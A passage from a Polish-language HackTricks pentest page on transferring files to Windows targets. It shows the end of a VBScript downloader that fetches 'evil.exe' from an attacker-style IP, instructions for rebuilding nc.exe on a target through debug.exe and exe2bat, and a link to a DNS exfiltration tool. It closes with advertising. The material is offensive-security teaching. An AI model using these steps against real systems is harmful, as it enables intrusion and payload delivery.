echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do odbudowywania ich na podstawie heksadecymalnych danych**. Oznacza to, że poprzez dostarczenie heksadecymalnych danych binarnych, `debug.exe` może wygenerować plik binarny. Jednak ważne jest zauważenie, że debug.exe ma **ograniczenie składania plików o maksymalnym rozmiarze 64 kb**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Następnie skopiuj i wklej ten tekst do okna powłoki systemu Windows, a zostanie utworzony plik o nazwie nc.exe.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi Twoją powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>
